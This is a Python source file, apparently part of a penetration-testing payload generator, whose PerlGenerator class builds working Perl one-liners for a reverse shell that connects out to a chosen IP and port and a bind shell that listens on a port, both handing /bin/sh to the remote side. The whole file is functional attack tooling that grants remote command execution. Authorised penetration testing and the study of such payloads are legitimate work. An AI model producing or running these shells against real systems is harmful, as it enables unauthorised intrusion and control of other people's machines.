"""
Perl reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class PerlGenerator(PayloadGenerator):
    """Standard Perl IO::Socket reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"perl -e 'use Socket;"
            f'$i="{ip}";$p={port};'
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f'exec("/bin/sh -i");}};\'')

    def bind(self, port: int) -> str:
        return (
            f"perl -e 'use Socket;"
            f"$p={port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack(\"l\",1));"
            f"bind(S,sockaddr_in($p,INADDR_ANY));"
            f"listen(S,SOMAXCONN);"
            f"for(;$p=accept(C,S);close C){{"
            f"open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");"
            f'exec("/bin/sh -i");}};\'')

    def file_extension(self) -> str:
        return ".pl"
